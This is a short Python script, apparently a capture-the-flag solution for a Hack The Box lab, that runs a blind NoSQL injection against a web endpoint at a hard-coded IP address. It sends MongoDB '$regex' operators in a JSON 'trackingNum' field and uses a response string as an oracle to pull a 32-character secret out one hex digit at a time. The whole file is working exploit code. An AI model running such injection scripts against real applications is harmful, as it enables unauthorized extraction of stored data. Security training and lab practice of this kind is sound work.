import requests
import json

# Oracle
def oracle(t):
    r = requests.post(
        "http://94.237.55.43:51621/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text

# Make sure the oracle is functioning correctly
assert (oracle("X") == False)
assert (oracle({"$regex": "HTB{.*"}) == True)

# dump the tracking numbers

trackingNum = "HTB{"
for _ in range(32): # repeat 32 times
    for c in "0123456789abcdef":
        if oracle({"$regex":"^" + trackingNum+ c}):
             trackingNum += c 
             break
trackingNum += "}"


assert (oracle(trackingNum)== True)

print("Tracking Number:" + trackingNum)
